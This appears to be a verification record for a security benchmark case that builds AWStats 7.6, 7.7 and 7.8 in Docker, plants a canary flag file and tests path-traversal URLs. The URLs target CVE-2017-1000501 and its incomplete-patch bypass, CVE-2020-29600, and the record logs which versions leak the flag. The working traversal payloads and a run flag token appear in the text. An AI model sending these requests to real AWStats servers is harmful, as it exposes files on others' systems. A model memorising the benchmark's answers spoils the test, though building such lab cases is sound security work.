# generated: 2026-07-10 (real Docker verification)
# Per-run canary token planted at /pcb_canary/flag.conf via compose entrypoint from $PCB_FLAG,
# as a one-line AWStats config:  Include "<FLAG>"
# Gate run flag: PCBFLAG_5efca0a84579cfffb895ce858db559fd

## Recipe bring-up (no committed images/source; AWStats git-cloned at pinned tags at build)
  PCB_FLAG=<token> docker compose --profile v0 --profile v1 up -d --build
  # Dockerfile: debian:bookworm-slim + apache2 + perl; git clone --depth 1 --branch <7.6|7.7|7.8>
  #             https://github.com/eldy/awstats.git -> /usr/lib/cgi-bin/awstats.pl (mod_cgid)
  # entrypoint: printf 'Include "%s"\n' "$PCB_FLAG" > /pcb_canary/flag.conf  (outside docroot &
  #             outside every AWStats config search dir), then exec apache2ctl -D FOREGROUND
  # `python3 oracle.py --run-gate` does the whole build -> up -> gate -> down cycle automatically.

## Defended boundary (patch.diff): CVE-2017-1000501 fix adds `$SiteConfig =~ s/\.\.//g`
##   in awstats.pl, stripping `..` from the config=-derived path before Read_Config opens it.
##   Read_Config still keeps the File::Spec->rel2abs($SiteConfig) absolute-path fallback (until 7.8).

## Payloads (sent with curl --path-as-is)
  original (CVE-2017-1000501, uses `..`)      : /cgi-bin/awstats.pl?config=/etc/../pcb_canary/flag.conf
  bypass   (CVE-2020-29600, pure absolute)    : /cgi-bin/awstats.pl?config=/pcb_canary/flag.conf

## V0 = AWStats 7.6 (port 38760) — vulnerable to CVE-2017-1000501
  original `..` traversal : FLAG-HIT   (no `s/\.\.//g`; path resolves to /pcb_canary/flag.conf)
  bypass   absolute       : FLAG-HIT
  normal   config=flag    : no-flag    (only searches config dirs; canary unreachable)

## V1 = AWStats 7.7 (port 38761) — 1000501 patched INCOMPLETELY (THE TARGET the system attacks)
  original `..` traversal : no-flag    <- seed BLOCKED: `s/\.\.//g` strips `..`, path unresolved (differential precondition)
  bypass   absolute       : FLAG-HIT   <- residual CONFIRMED: no `..` to strip; rel2abs fallback opens /pcb_canary/flag.conf
  normal   config=flag    : no-flag

## V2 = AWStats 7.8 (port 38762) — CVE-2020-29600 patched (optional negative)
  original `..` traversal : no-flag    (closed)
  bypass   absolute       : no-flag    (CLOSED: rel2abs absolute-path fallback commented out)

## Build-time gate (benchmark/flag_oracle.validate_case via `python3 oracle.py --run-gate`)
  original_poc_reaches_flag_on_v0 : true
  original_poc_blocked_on_v1      : true
  bypass_poc_reaches_flag_on_v1   : true
  passed                          : true
  _env_ready                      : {"v0": true, "v1": true}

## Teardown
  PCB_FLAG=teardown docker compose --profile v0 --profile v1 --profile v2 down -v --rmi all
